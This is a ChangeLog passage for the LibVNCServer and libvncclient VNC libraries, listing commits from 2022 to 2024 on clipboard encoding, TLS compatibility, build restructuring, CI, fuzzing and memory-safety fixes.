2024-12-22  Christian Beier <info@christianbeier.net>

	* Doxyfile: doc: configure Doxygen for doxygen-awesome-css

2024-12-22  Christian Beier <info@christianbeier.net>

	* .gitignore: .gitignore: update

2024-12-22  Christian Beier <info@christianbeier.net>

	* .gitmodules, doc/doxygen-awesome-css: build: add
	doxygen-awesome-css submodule

2024-12-22  Christian Beier <info@christianbeier.net>

	* .gitignore: .gitignore: clean up

2024-12-22  Christian Beier <info@christianbeier.net>

	* Doxyfile: docs: adapt Doxyfile to new structure

2024-12-22  Christian Beier <info@christianbeier.net>

	* NEWS.md: NEWS: update

2024-12-22  Christian Beier <info@christianbeier.net>

	* AUTHORS: AUTHORS: update

2023-03-05  Gaurav Ujjwal <gujjwal00@gmail.com>

	* src/libvncclient/rfbclient.c: libvncclient: Improve Extended
	Clipboard encoding compatibility Many servers can't handle zlib streams created by compress()
	function of zlib library. Primary bug is that these servers don't
	expect inflate() to return Z_STREAM_END, which is the case for
	streams created by compress().  Affected servers: LibVNCServer UltraVNC TigerVNC (<= 1.10)

2023-03-05  Gaurav Ujjwal <gujjwal00@gmail.com>

	* src/libvncclient/rfbclient.c: libvncclient: Fix text length in
	extended clipboard encoding Text data sent via extended clipboard encoding is null-terminated
	and this null character is counted in the length field sent to
	server.  E.g. for "abc", bytes  {'a', 'b', 'c', '\0'} are sent with length =
	4.

2023-03-05  Gaurav Ujjwal <gujjwal00@gmail.com>

	* src/libvncserver/rfbserver.c:  libvncserver: Handle 'Z_STREAM_END' in zlib stream decompression According to zlib manual (https://zlib.net/manual.htm): "inflate() returns Z_OK if some progress has been made (more input
	processed or more output produced), Z_STREAM_END if the end of the
	compressed data has been reached and all uncompressed output has
	been produced"

2024-12-19  Christian Beier <info@christianbeier.net>

	* src/libvncserver/rfbserver.c: libvncserver: fix fallback Latin1
	sending in rfbSendServerCutTextUTF8()

2024-11-19  Gaurav Ujjwal <gujjwal00@gmail.com>

	* include/rfb/rfb.h, src/libvncserver/main.c,
	src/libvncserver/rfbserver.c: Libvncserver: Enable ExtendedClipboard
	encoding only when app signals support for UTF-8 cut-text A UTF-8 capable client will usually prefer to send cut-text via
	ExtendedClipboard encoding once libvncserver declares support for
	it. If app doesn't assign a setXCutTextUTF8() callback, the default
	handler is used which is no-op. So client-to-server clipboard
	transfer will not work.  Re: #638

2024-10-31  re2zero <yangwu@uniontech.com>

	* examples/client/qt5client.cpp: examples: add mouse events handle
	for Qt example Resize the widget to after client init success; and the mouse events
	handle.  Log: add mouse events handle for Qt example.

2024-10-20  Christian Beier <info@christianbeier.net>

	* src/libvncclient/tls_openssl.c: libvncclient: tls_openssl: fix
	connection setup w/ newer LibreSSL This needs the security level setting as well.  re https://github.com/bk138/multivnc/issues/245

2024-09-23  Chih-Hsuan Yen <645432-yan12125@users.noreply.gitlab.com>

	* src/libvncclient/tls_gnutls.c: libvncclient: improve compatibility
	with GnuTLS 3.8 Since GnuTLS 3.8, TTLS-SRP is disabled by default at compile time
	[1].  As a result, connecting to a server via TLS fails with: > Warning: Failed to set TLS priority: The request is invalid.
	(+SRP).  > TLS handshake failed: No or insufficient priorities were set.  On the other hand, TLS-SRP is apparently unused in libvncclient. It
	seems TLS-SRP requires providing serveral parameters, including a
	username and a password, via specific GnuTLS API [2], which I didn't
	find in the codebase.  [1] https://gitlab.com/gnutls/gnutls/-/merge_requests/1681 [2]

	https://www.gnutls.org/manual/html_node/Authentication-using-SRP.html

2024-08-30  Christian Beier <info@christianbeier.net>

	* src/libvncserver/httpd.c: libvncserver: check for invalid socket
	before FD_ISSET in httpd A mere workaround/mitigation for when the socket is closed by
	another thread...

2024-08-26  Christian Beier <info@christianbeier.net>

	* src/libvncserver/main.c: libvncserver: mitigate FORTIFY crash in
	listenerRun() With the previous commit acac77968d6ea9a8f09d7b758fe1bffac31da7eb
	the select() call now times out, opening up for a race condition
	where rfbShutdownSockets() would set the listening sockets to -1,
	the select would time out and the FD_ISSET() call encounter a -1
	socket.  This is not 100% threadsafe but better than before.

2024-08-15  Christian Beier <info@christianbeier.net>

	* include/rfb/rfb.h, src/libvncserver/main.c: libvncserver: fix
	HTTPD for multithreaded servers This changes the select() call in listenerRun() to obey the usec
	value passed in from rfbRunEventloop(), aligning the multithreaded
	implementations to the single-threaded one. This in turn allows us
	to handle incoming HTTP connections as well.  Closes #514

2024-08-04  Christian Beier <info@christianbeier.net>

	* src/libvncserver/httpd.c: libvncserver/httpd: add comment about
	client handling shortcomings

2024-08-04  Christian Beier <info@christianbeier.net>

	* src/common/sockets.c: common/sockets: fix logic error in WIN32
	sock_set_nonblocking() impl According to

	https://learn.microsoft.com/en-us/windows/win32/winsock/winsock-ioctls"The lpvInBuffer parameter points at an unsigned long (QoS), which
	is nonzero if non-blocking mode is to be enabled and zero if it is
	to be disabled." Closes #613

2024-07-02  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt: CMake: set version to 0.9.15

2024-07-02  Christian Beier <info@christianbeier.net>

	* webclients/novnc: webclients: update noVNC to v1.5.0

2024-07-02  Christian Beier <info@christianbeier.net>

	* NEWS.md: NEWS: update

2024-07-02  Christian Beier <info@christianbeier.net>

	* AUTHORS: AUTHORS: update again

2024-07-02  Christian Beier <info@christianbeier.net>

	* AUTHORS: AUTHORS: update

2024-04-03  Nicolas Morais <45640048+nicmorais@users.noreply.github.com>

	* CMakeLists.txt, examples/client/qt5client.cpp: examples,build: add
	Qt client example * CMake: Adds C++ as project language * CMake: Adds WITH_QT option to build Qt client example * Examples: Adds qt5client.cpp * CMake: adds specific way of building Qt client example * CMake: try to find Qt if needed * CMake: makes Qt not required, quiet if not found * CMake: removes CXX as language * CMake: checks if we have C++ compiler before setting standard * CMake: checks C++ compiler before setting project languages I could not find a better solution. It seems like the languages must
	be set before almost everything.  * CMake: check if C++ compiler defined instead of string comparison * CMake: appends CXX to languages, in a better syntax As suggested by dantti * Examples: changes to static_cast in Qt5 client example As suggested by @dantti * Examples: adds description to Qt example * Examples: Qt example can't handle new fb size * Examples: adds additional condition to build Qt example This is need to remove the following message: 'CMake Error: Cannot
	determine link language for target' * CMake: adds comment about C++ example (Qt client) * Examples: adds CMake remarks to Qt client example * CMake: changes Qt5::Widgets to Qt5Widgets_LIBRARIES Just for standardization

2024-03-28  Christian Hitz <christian@klarinett.li>

	* src/common/crypto_openssl.c: common/crypto_openssl: load legacy
	provider in decrypt_rfbdes() Commit f135856fc3ce515afd16dbf91c44b89bab332726 added the same code
	to encrypt_rfbdes() Signed-off-by: Christian Hitz <christian.hitz@bbv.ch>

2024-03-17  Christian Beier <info@christianbeier.net>

	* README.md: README: remove zlibhex from supported encodings It's in fact not processed.  Closes #609

2024-03-08  flyqie <flyqie@outlook.com>

	* README.md: README: fix links to rfbproto

2024-03-07  Christian Beier <info@christianbeier.net>

	* src/libvncserver/cargs.c: libvncserver: make usage display more
	discoverable

2024-03-03  Christian Beier <info@christianbeier.net>

	* examples/server/README.md: build: add README for server examples

2024-03-03  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, examples/server/mac.c: build: remove macOS server
	example This was split off LibVNCServer and now resides in
	https://github.com/LibVNC/macVNC

2024-02-03  Jeffrey Knockel <jeff@jeffreyknockel.com>

	* src/libvncclient/tight.c: libvncclient: fix tight decoding
	endianness issues When the host byte order of a client is different from that of the
	RFB pixel format it is using, we must swap bytes before delivering
	them to the client.  This commit addresses places where we were not
	properly doing that during tight decoding, manifesting in issues in
	which solid filled rectangles and gradients could be decoded to the
	wrong color.  As the RFB protocol says: "Swap the pixel value
	according to big-endian-flag (e.g. if big-endian-flag is zero
	(false) and host byte order is big endian, then swap)."

2023-12-02  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt: CMake: log when libjpeg-turbo was found via header
	file

2023-11-25  Christian Beier <info@christianbeier.net>

	* .clang-format: build: add first .clang-format re #395

2023-11-24  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, cmake/Modules/FindLibSSH2.cmake,
	examples/client/sshtunnel.c: build,examples: use libsshtunnel for
	ssh tunnel example ...instead of libssh2 directly and lots of application logic.

2023-11-19  Sérgio Basto <sergio@serjux.com>

	* CMakeLists.txt: build: use FFMPEG_INCLUDE_DIRS ... for building vnc2mpg example.

2023-11-17  Christian Beier <info@christianbeier.net>

	* README.md: README: document where to find libwinpthread-1.dll re #482

2023-08-30  Christian Beier <info@christianbeier.net>

	* src/libvncserver/main.c: Revert "libvncserver: detach client
	thread before ending it" This reverts commit 8560a5a72d76fc3ab3484ca41f604116807f34e8.  It caused several crashes when ending a server: client threads would
	sometimes linger around until after the server was stopped and its
	rfbScreen internals free()ed, with these client threads trying to
	access rfbScreen and friends: ð£.  Reopens #570

2023-08-22  Christian Beier <info@christianbeier.net>

	* src/libvncserver/main.c: libvncserver: make client names in
	rfbScreenCleanup() less cryptic

2023-08-16  Christian Beier <info@christianbeier.net>

	* test/blooptest.c: test: remove unused blooptest Already in server/examples.

2023-08-05  Christian Beier <info@christianbeier.net>

	* src/libvncserver/main.c: libvncserver: detach client thread before
	ending it Before, we were joining the thread in rfbShutdownServer(), which
	cleaned up after its resources in that case, but there was no
	cleanup when a client disconnected on its own, as noted in #570.  Closes #570.  Builds upon and closes #574.

2023-08-05  Christian Beier <info@christianbeier.net>

	* include/rfb/threading.h: common/threading: add THREAD_DETACH

2023-07-07  Christian Beier <info@christianbeier.net>

	* README.md: README: add pointer to chat and issues

2023-07-04  Christian Beier <info@christianbeier.net>

	* include/rfb/rfbclient.h, src/libvncclient/rfbclient.c,
	src/libvncclient/vncviewer.c: libvncclient: add functionality to set
	what a client is requesting With this new API, the caller can tell the client to only request a
	subset of the remote framebuffer during incremental framebuffer
	requests.

2023-07-04  Christian Beier <info@christianbeier.net>

	* examples/client/SDLvncviewer.c: examples/client: don't set
	updateRect in SDLvncviewer This is already done by the library.

2023-07-04  Christian Beier <info@christianbeier.net>

	* .github/workflows/ci.yml: .github: fix MacOS CI re https://github.com/orgs/Homebrew/discussions/4612

2023-07-04  Christian Beier <info@christianbeier.net>

	* include/rfb/rfbclient.h: libvncclient: change comment to reflect
	file rename

2023-07-03  Christian Beier <info@christianbeier.net>

	* src/libvncclient/rfbclient.c: libvncclient: de-dup client width
	and height setting code

2023-06-26  Christian Beier <info@christianbeier.net>

	* examples/server/1instance.c: examples/server/1instance: remove
	unused file

2023-06-22  Christian Beier <info@christianbeier.net>

	* src/libvncserver/sockets.c: libvncserver: null extension data
	after closing in rfbCloseClient If the function 'close' points to does a free() _and_ checks for
	NULL (as is the case for rfbTightExtensionClientClose()), this
	prevents double free()s.  If the function 'close' points to does not do a free(), nulling out
	the data after closing out should (semantically) not do harm.  Closes #585

2023-05-25  Mingjie Shen <shen497@purdue.edu>

	* examples/server/pnmshow.c, examples/server/pnmshow24.c,
	test/bmp.c: examples,test: fix integer overflows in calculating
	alloc sizes Allocating memory with a size controlled by an external user can
	result in integer overflow.

2023-05-25  JorisHansMeijer <36713790+JorisHansMeijer@users.noreply.github.com>

	* src/libvncserver/rfbserver.c: libvncserver: fix memory leak on
	webclient disconnect The webocket context was not free'd on client disconnect.

2023-05-19  Mingjie Shen <shen497@purdue.edu>

	* examples/client/SDLvncviewer.c: examples: check return values of
	malloc for null

2023-05-20  Mingjie Shen <mjshen137@gmail.com>

	* test/tjbench.c: test: fix offset used before range check This use of offset 'i' should follow the range check.

2023-05-20  Mingjie Shen <mjshen137@gmail.com>

	* test/tjbench.c: test: fix comparison that is always false If srcsize is an unsigned long, then the comparison
	(srcsize=ftell(file))<0 is always false.

2023-05-20  Mingjie Shen <mjshen137@gmail.com>

	* examples/server/pnmshow.c, examples/server/pnmshow24.c,
	test/bmp.c: examples,test: check that calls to 'sscanf' write to
	output vars

2023-05-16  Christian Beier <info@christianbeier.net>

	* src/libvncclient/vncviewer.c: libvncclient: close listening IPv6
	sockets in rfbClientCleanup() too

2023-04-03  Volodymyr Samokhatko <samokhatko@anatoscope.com>

	* src/libvncserver/cursor.c: libvncserver: fix vertical blank stripe
	on cursor converted from alpha source

2023-02-20  Nicolas Morais <45640048+nicmorais@users.noreply.github.com>

	* examples/server/x11.c: examples: fix visual artifacts with Tight
	encoding in x11 server * Sets bpp to 4 in X11 Server example * Undoes changing of types from signed int to unsigned --------- Co-authored-by: Nicolas Morais <nsantos10@lenovo.com>

2023-02-17  Tobias Junghans <tobydox@veyon.io>

	* src/libvncclient/rfbclient.c: libvncclient: cast buf when calling
	GotXCutTextUTF8() buf is an unsigned char pointer while GotXCutTextUTF8() takes a char
	pointer.

2023-02-17  Tobias Junghans <tobydox@veyon.io>

	* src/libvncclient/rfbclient.c: libvncclient: fix type of csz zlib's compress() takes a pointer to a uLong variable. uLong may be
	32 bit only while size_t is 64 bit on 64 bit platforms. This causes
	a compiler warning/error and potentially UB.

2023-02-13  Christian Beier <info@christianbeier.net>

	* README.md: README: fix links to examples

2023-02-13  Christian Beier <info@christianbeier.net>

	* src/libvncclient/rfbclient.c: libvncclient: make client callback
	indicative for Extended Clipboard A client which has GotXCutTextUTF8 set indicates it can handle UTF8
	cuttext from the server. Older clients will not have this set and
	thus not opt in for UTF8 (and depending on the server
	implementation, thus not opt out from Latin1, resulting in no
	cuttext from server at all for them).  re

	https://github.com/LibVNC/libvncserver/pull/552#issuecomment-1427874738

2023-02-13  Christian Beier <info@christianbeier.net>

	* NEWS.md: NEWS: update with latest changes

2023-02-13  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, src/libvncclient/{rfbproto.c => rfbclient.c}: 
	build: rename libvnclient/rfbproto.c to libvncclient/rfbclient.c

2023-01-08  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, {rfb => include/rfb}/default8x16.h, {rfb =>
	include/rfb}/keysym.h, {rfb => include/rfb}/rfb.h, {rfb =>
	include/rfb}/rfbclient.h, {rfb => include/rfb}/rfbconfig.h.cmakein,
	{rfb => include/rfb}/rfbproto.h, {rfb => include/rfb}/rfbregion.h,
	{rfb => include/rfb}/threading.h, {common => src/common}/base64.c,
	{common => src/common}/base64.h, {common => src/common}/crypto.h,
	{common => src/common}/crypto_included.c, {common =>
	src/common}/crypto_libgcrypt.c, {common =>
	src/common}/crypto_openssl.c, {common => src/common}/d3des.c,
	{common => src/common}/d3des.h, {common => src/common}/lzoconf.h,
	{common => src/common}/lzodefs.h, {common => src/common}/minilzo.c,
	{common => src/common}/minilzo.h, {common =>
	src/common}/sha-private.h, {common => src/common}/sha.h, {common =>
	src/common}/sha1.c, {common => src/common}/sockets.c, {common =>
	src/common}/sockets.h, {common => src/common}/turbojpeg.c, {common
	=> src/common}/turbojpeg.h, {common => src/common}/vncauth.c,
	{common => src/common}/zywrletemplate.c, {libvncclient =>
	src/libvncclient}/corre.c, {libvncclient =>
	src/libvncclient}/cursor.c, {libvncclient =>
	src/libvncclient}/hextile.c, {libvncclient =>
	src/libvncclient}/libvncclient.pc.cmakein, {libvncclient =>
	src/libvncclient}/listen.c, {libvncclient =>
	src/libvncclient}/rfbproto.c, {libvncclient =>
	src/libvncclient}/rre.c, {libvncclient => src/libvncclient}/sasl.c,
	{libvncclient => src/libvncclient}/sasl.h, {libvncclient =>
	src/libvncclient}/sockets.c, {libvncclient =>
	src/libvncclient}/tight.c, {libvncclient =>
	src/libvncclient}/tls.h, {libvncclient =>
	src/libvncclient}/tls_gnutls.c, {libvncclient =>
	src/libvncclient}/tls_none.c, {libvncclient =>
	src/libvncclient}/tls_openssl.c, {libvncclient =>
	src/libvncclient}/trle.c, {libvncclient =>
	src/libvncclient}/ultra.c, {libvncclient =>
	src/libvncclient}/vncviewer.c, {libvncclient =>
	src/libvncclient}/zlib.c, {libvncclient =>
	src/libvncclient}/zrle.c, {libvncserver =>
	src/libvncserver}/auth.c, {libvncserver =>
	src/libvncserver}/cargs.c, {libvncserver =>
	src/libvncserver}/corre.c, {libvncserver =>
	src/libvncserver}/cursor.c, {libvncserver =>
	src/libvncserver}/cutpaste.c, {libvncserver =>
	src/libvncserver}/draw.c, {libvncserver =>
	src/libvncserver}/font.c, {libvncserver =>
	src/libvncserver}/hextile.c, {libvncserver =>
	src/libvncserver}/httpd.c, {libvncserver =>
	src/libvncserver}/libvncserver.pc.cmakein, {libvncserver =>
	src/libvncserver}/main.c, {libvncserver =>
	src/libvncserver}/private.h, {libvncserver =>
	src/libvncserver}/rfbregion.c, {libvncserver =>
	src/libvncserver}/rfbserver.c, {libvncserver =>
	src/libvncserver}/rfbssl.h, {libvncserver =>
	src/libvncserver}/rfbssl_gnutls.c, {libvncserver =>
	src/libvncserver}/rfbssl_none.c, {libvncserver =>
	src/libvncserver}/rfbssl_openssl.c, {libvncserver =>
	src/libvncserver}/rre.c, {libvncserver =>
	src/libvncserver}/scale.c, {libvncserver =>
	src/libvncserver}/scale.h, {libvncserver =>
	src/libvncserver}/selbox.c, {libvncserver =>
	src/libvncserver}/sockets.c, {libvncserver =>
	src/libvncserver}/stats.c, {libvncserver =>
	src/libvncserver}/tableinit24.c, {libvncserver =>
	src/libvncserver}/tableinitcmtemplate.c, {libvncserver =>
	src/libvncserver}/tableinittctemplate.c, {libvncserver =>
	src/libvncserver}/tabletrans24template.c, {libvncserver =>
	src/libvncserver}/tabletranstemplate.c, {libvncserver =>
	src/libvncserver}/tight.c, {libvncserver =>
	src/libvncserver}/tightvnc-filetransfer/filelistinfo.c,
	{libvncserver =>
	src/libvncserver}/tightvnc-filetransfer/filelistinfo.h,
	{libvncserver =>
	src/libvncserver}/tightvnc-filetransfer/filetransfermsg.c,
	{libvncserver =>
	src/libvncserver}/tightvnc-filetransfer/filetransfermsg.h,
	{libvncserver =>
	src/libvncserver}/tightvnc-filetransfer/handlefiletransferrequest.c
	, {libvncserver =>
	src/libvncserver}/tightvnc-filetransfer/handlefiletransferrequest.h
	, {libvncserver =>
	src/libvncserver}/tightvnc-filetransfer/rfbtightproto.h,
	{libvncserver =>
	src/libvncserver}/tightvnc-filetransfer/rfbtightserver.c,
	{libvncserver => src/libvncserver}/translate.c, {libvncserver =>
	src/libvncserver}/ultra.c, {libvncserver =>
	src/libvncserver}/websockets.c, {libvncserver =>
	src/libvncserver}/ws_decode.c, {libvncserver =>
	src/libvncserver}/ws_decode.h, {libvncserver =>
	src/libvncserver}/zlib.c, {libvncserver =>
	src/libvncserver}/zrle.c, {libvncserver =>
	src/libvncserver}/zrleencodetemplate.c, {libvncserver =>
	src/libvncserver}/zrleoutstream.c, {libvncserver =>
	src/libvncserver}/zrleoutstream.h, {libvncserver =>
	src/libvncserver}/zrlepalettehelper.c, {libvncserver =>
	src/libvncserver}/zrlepalettehelper.h, {libvncserver =>
	src/libvncserver}/zrletypes.h: build: centralise sources in src dir,
	move rfb to include dir

2023-02-13  Christian Beier <info@christianbeier.net>

	* examples/client/SDLvncviewer.c: examples: wire up utf-8 clipboard
	handling in SDLVncviewer

2023-02-13  Christian Beier <info@christianbeier.net>

	* libvncclient/rfbproto.c, rfb/rfbclient.h: libvncclient: rework
	utf-8 clipboard API to resemble libvncserver one Public LibVNCServer API has * `rfbSendServerCutTextUTF8(rfbScreenInfoPtr rfbScreen,char *str,
	int len, char *fallbackLatin1Str, int latin1Len);` * and `typedef void (*rfbSetXCutTextUTF8ProcPtr) (char* str,int len,
	  struct _rfbClientRec* cl);` which is wired up as `setXCutTextUTF8`, i.e. it's got a unicode sender w/ Latin1 fallback and a dedicated
	unicode receiver.  This commit reworks the libvncclient API to have a dedicated UTF8
	clipboard sending function and a dedicated on-receive callback.  Applications can use those functions instead of changing state with
	some rfbClient member.

2023-02-13  Christian Beier <info@christianbeier.net>

	* SECURITY.md: SECURITY: hint at at GitHub form

2023-02-11  Christian Beier <info@christianbeier.net>

	* webclients/novnc: webclients: update noVNC to v1.4.0

2023-02-06  kai <wuhanck@hotmail.com>

	* libvncclient/rfbproto.c, rfb/rfbclient.h: libvncclient: add utf-8
	clipboard support Closes #552

2023-01-30  Christian Beier <info@christianbeier.net>

	* .github/workflows/ci.yml: .github: remove fuzzing_build re

	https://github.com/LibVNC/libvncserver/pull/556#issuecomment-1408127231

2023-01-30  Christian Beier <info@christianbeier.net>

	* test/fuzz_server.c: test: document fuzz_server usage, by OSS-Fuzz
	and locally re

	https://github.com/LibVNC/libvncserver/pull/556#issuecomment-1408127231

2023-01-29  Catena cyber <35799796+catenacyber@users.noreply.github.com>

	* .github/workflows/cifuzz.yml: .github: add CIFuzz workflow This is

	https://google.github.io/oss-fuzz/getting-started/continuous-integration/* ci: add CIFuzz workflow * 30 seconds of fuzzing

2023-01-26  Catena cyber <35799796+catenacyber@users.noreply.github.com>

	* libvncserver/tableinittctemplate.c: libvncserver: check before
	shifting in table init As it can turn into undefined behavior like shift exponent 32 is too
	large for 32-bit type 'uint32_t'

2023-01-25  Catena cyber <35799796+catenacyber@users.noreply.github.com>

	* libvncserver/tableinittctemplate.c: libvncserver: add an explicit
	cast before shift Shifting a signed integer can result in undefined behavior.

2023-01-25  kai <wuhanck@hotmail.com>

	* libvncclient/sasl.c: libvncclient: plug more memleaks in SASL
	handling

2023-01-24  Christian Beier <info@christianbeier.net>

	* .github/workflows/ci.yml: .github: install some build deps for Win
	CI, remove useless runs

2023-01-23  Gaurav Ujjwal <gujjwal00@gmail.com>

	* common/crypto_openssl.c: common/crypto_openssl: pad DH key buffers
	with leading zeros for smaller keys Re: https://github.com/LibVNC/libvncserver/issues/493 Re:
	https://github.com/bk138/multivnc/issues/202

2023-01-22  Christian Beier <info@christianbeier.net>

	* examples/client/sshtunnel.c: examples/client/sshtunnel: include
	headers req'd by some OS's ...namely FreeBSD where accept requires <sys/types.h> and
	<sys/socket.h> and close requires <unistd.h>.  Closes #548

2023-01-21  Christian Beier <info@christianbeier.net>

	* libvncclient/vncviewer.c: libvncclient: include header for
	tjDestroy()

2022-09-29  Obermayr Johann <johann.obermayr@sigmatek.at>

	* libvncclient/cursor.c, libvncclient/vncviewer.c: libvncclient: fix
	possible memory leak in some parts of the code it was possible to lose track of
	resources. Cleaning them up fixes the possibility for memory leaks.

2023-01-20  Peter V <peter.vicman@gmail.com>

	* common/crypto_openssl.c: common/crypto_openssl: fix build with
	openssl >= 3.0.0 DES encryption is considered legacy and is no longer available by
	default. To use it legacy provider must be load.

2023-01-18  Christian Beier <info@christianbeier.net>

	* .github/workflows/ci.yml: .github: provide a ctest configuration needed for Windows

2023-01-18  Christian Beier <info@christianbeier.net>

	* .github/workflows/ci.yml: .github: split test prep into own step
	to only run it for ubuntu

2023-01-18  Christian Beier <info@christianbeier.net>

	* .github/workflows/ci.yml: .github: add first bare Windows CI

2023-01-18  Plan C <hubenchang0515@outlook.com>

	* examples/server/x11.c: examples: fix type mismatch in x11 server
	example

2023-01-11  Plan C <hubenchang0515@outlook.com>

	* .gitignore, CMakeLists.txt, examples/server/x11.c: examples: add
	an XCB-based X11 example * examples/x11vncserver: add X11 example * examples/x11vncserver: add comments abot compiling * add `x11vncserver.c` in the CMake build system * use `FindX11.cmake` and clear `NOTFOUND` * add some comments * add some comments * rename x11vncserver to x11 * Need CMake 3.24.0 to find X11 libraries * Need CMake 3.24.0 to find XCB libraries

2023-01-08  Catena cyber <35799796+catenacyber@users.noreply.github.com>

	* .github/workflows/ci.yml, CMakeLists.txt,
	libvncserver/rfbserver.c, libvncserver/sockets.c,
	test/fuzz_server.c: test: add one first fuzz target re google/oss-fuzz#5137 for oss-fuzz integration

2023-01-08  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, {client_examples =>
	examples/client}/SDLvncviewer.c, {client_examples =>
	examples/client}/backchannel.c, {client_examples =>
	examples/client}/gtkvncviewer.c, {client_examples =>
	examples/client}/ppmtest.c, {client_examples =>
	examples/client}/sshtunnel.c, {client_examples =>
	examples/client}/vnc2mpg.c, examples/{ => server}/1instance.c,
	examples/{ => server}/androidvncserver.c, examples/{ =>
	server}/backchannel.c, examples/{ => server}/blooptest.c,
	examples/{ => server}/camera.c, examples/{ =>
	server}/colourmaptest.c, examples/{ => server}/cursors.c,
	examples/{ => server}/example.c, examples/{ =>
	server}/filetransfer.c, examples/{ => server}/fontsel.c, examples/{
	=> server}/mac.c, examples/{ => server}/pnmshow.c, examples/{ =>
	server}/pnmshow24.c, examples/{ => server}/radon.h, examples/{ =>
	server}/regiontest.c, examples/{ => server}/repeater.c, examples/{
	=> server}/rotate.c, examples/{ => server}/rotatetemplate.c,
	examples/{ => server}/simple.c, examples/{ => server}/simple15.c,
	examples/{ => server}/storepasswd.c, examples/{ => server}/vncev.c,
	examples/{ => server}/zippy.c: build: move client and server
	examples to one examples dir

2023-01-08  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, libvncclient.pc.cmakein =>
	libvncclient/libvncclient.pc.cmakein, libvncserver.pc.cmakein =>
	libvncserver/libvncserver.pc.cmakein: build: remove pkg-config
	templates out of root dir

2022-12-18  Christian Beier <info@christianbeier.net>

	* ChangeLog: Update ChangeLog for 0.9.14

2022-12-18  Christian Beier <info@christianbeier.net>

	* README.md: README: document Changelog update tool

2022-12-18  Christian Beier <info@christianbeier.net>

	* NEWS.md: NEWS: add intro and highlights of v0.9.14 re #542

2022-12-18  Christian Beier <info@christianbeier.net>

	* README.md: README: update section about server-side scaling ...as this has been tested now with UltraVNC.  Closes #373

2022-12-18  Christian Beier <info@christianbeier.net>

	* README.md: README: mention needed client msg for server-side
	scaling re #373

2022-12-18  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt: CMake: set version to 0.9.14 re #542

2022-12-04  Christian Beier <info@christianbeier.net>

	* webclients/novnc: webclients: update noVNC to v1.3.0

2022-12-04  Christian Beier <info@christianbeier.net>

	* README.md: README: update release guidelines

2022-12-04  Christian Beier <info@christianbeier.net>

	* README.md: README: fix reversed RFB operation logic

2022-12-04  Christian Beier <info@christianbeier.net>

	* README.md: README: list some 'slow link' strategies re #373

2022-12-04  Christian Beier <info@christianbeier.net>

	* rfb/rfb.h: docs: add TOC to LibVNCServer doxygen docu

2022-12-03  Christian Beier <info@christianbeier.net>

	* NEWS.md: NEWS: update for v0.9.14

2022-12-02  Christian Beier <info@christianbeier.net>

	* README.md: README: add one more release checklist item

2022-12-02  Christian Beier <info@christianbeier.net>

	* AUTHORS: AUTHORS: add new contributors since v0.9.13

2022-11-13  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, common/sockets.c, common/sockets.h,
	libvncclient/sockets.c, rfb/rfbconfig.h.cmakein: Revert
	"libvncclient: use poll() if available" This reverts commit 993df68933db378ba862af05809d6e4938333d6e.  The new poll() functionality broke connecting a LibVNCServer-based
	server to an RFB repeater, so reverting this for now.  Closes https://github.com/bk138/droidVNC-NG/issues/109

2022-11-03  Christian Beier <info@christianbeier.net>

	* cmake/Modules/FindLibSSH2.cmake: build: add FindLibSSH2.cmake Closes #539

2022-11-03  Christian Beier <info@christianbeier.net>

	* .gitignore: .gitignore: don't ignore *.cmake re #539

2022-10-05  Christian Beier <info@christianbeier.net>

	* README.md: README: add release checklist

2022-10-05  Christian Beier <info@christianbeier.net>

	* .travis.yml: TravisCI: remove

2022-10-05  Christian Beier <info@christianbeier.net>

	* README.md: README: exchange TravisCI badge with GitHub one

2022-10-05  Christian Beier <info@christianbeier.net>

	* .github/workflows/ci.yml: .github: port TravisCI to GitHub
	workflow

2022-10-05  Christian Beier <info@christianbeier.net>

	* cmake/Toolchain-cross-mingw32-linux.cmake: CMake: default to
	64-bit wine in toolchain file

2022-10-05  Christian Beier <info@christianbeier.net>

	* common/sockets.c: common: fix sockets compilation w/ XCode13

2022-09-22  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/tight.c: tight: fix OOB memory accesses As of 7124b5fbcf0df8db4d3f73023d77af6ea56409e7 the maximum rect
	width and size are equal for every compression level so we can
	easily save the LUT entries by using constants instead.  This fixes OOB memory accesses in rfbNumCodedRectsTight() when being
	called by rfbSendFramebufferUpdate() before SendRectEncodingTight()
	is being called the first time (which limits cl->tightCompressLevel
	to the size of tightConf).

2022-09-22  Tobias Junghans <tobydox@veyon.io>

	* rfb/rfb.h: rfb: remove unused variable declaration

2022-09-24  Christian Beier <info@christianbeier.net>

	* common/sockets.c: common: fix typo in sock_set_nonblocking() Closes #535

2022-08-23  Tobias Junghans <tobydox@veyon.io>

	* CMakeLists.txt, common/sockets.c, common/sockets.h,
	libvncclient/sockets.c, rfb/rfbconfig.h.cmakein: libvncclient: use
	poll() if available select() does not work with file descriptors > 1024 so use the more
	modern poll() function if available.

2022-08-11  Maksym Sobolyev <sobomax@sippysoft.com>

	* libvncserver/cursor.c: libvncserver: ensure cursorMutex is locked
	before cursor access This fixes multiple crashes with VirtualBox 6.1.x running Ubuntu
	22.04 guest when remote cursor is enabled (TightVNC client).

2022-08-11  Christian Beier <info@christianbeier.net>

	* libvncserver/httpd.c, libvncserver/sockets.c: libvncserver: clear
	fd sets before closing sockets This caused fdsan aborts due to
	0c9e68a9cc0abd8eda232bad169a62ff352fc571.

2022-08-11  Christian Beier <info@christianbeier.net>

	* libvncserver/sockets.c: libvncserver: make rfbConnectToTCPAddr()
	time out ...using rfbMaxClientWait for now.  Closes #532

2022-08-11  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, common/sockets.c, common/sockets.h,
	libvncclient/sockets.c, libvncserver/sockets.c: common: move here
	two socket helper functions from server and client re #532

2022-08-11  Christian Beier <info@christianbeier.net>

	* Doxyfile: docs: don't show internals in Doxygen-docs

2022-08-09  Christian Beier <cb@shoutrlabs.com>

	* libvncclient/rfbproto.c: libvncclient: prevent acting on
	ExtendedDesktopSize with 0 dimensions This is sent by UltraVNC 1.3.2 at least.

2022-08-05  Christian Beier <info@christianbeier.net>

	* libvncserver/main.c: libvncserver: prevent cursor drawing during
